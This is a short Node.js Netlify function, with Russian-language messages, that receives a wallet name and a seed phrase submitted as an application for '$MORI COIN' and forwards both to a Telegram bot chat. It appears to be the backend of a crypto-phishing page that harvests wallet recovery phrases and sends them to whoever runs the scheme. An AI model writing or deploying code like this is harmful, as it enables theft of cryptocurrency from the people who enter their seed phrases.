const axios = require('axios');

function sanitizeText(text) {
    if (typeof text !== 'string') return '';
    return text.replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

exports.handler = async function (event) {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Метод не разрешен' }),
        };
    }

    try {
        const { walletName, seedPhrase } = JSON.parse(event.body);
        const { BOT_TOKEN, CHAT_ID } = process.env;

        if (!BOT_TOKEN || !CHAT_ID) {
          throw new Error("Секретные ключи не настроены на сервере.");
        }

        if (!walletName || !seedPhrase) {
            return {
                statusCode: 400,
                body: JSON.stringify({ success: false, message: 'Отсутствуют необходимые данные.' }),
            };
        }

        const sanitizedWallet = sanitizeText(walletName);
        const sanitizedPhrase = sanitizeText(seedPhrase);

        const message = `Новая заявка на $MORI COIN:
Кошелёк: ${sanitizedWallet}
Сид фраза: ${sanitizedPhrase}`;
        
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, message: 'Заявка успешно отправлена!' }),
        };

    } catch (error) {
        console.error('Ошибка в функции Netlify:', error.message);
        return {
            statusCode: 500,
            body: JSON.stringify({ success: false, message: `Ошибка на сервере.` }),
        };
    }
};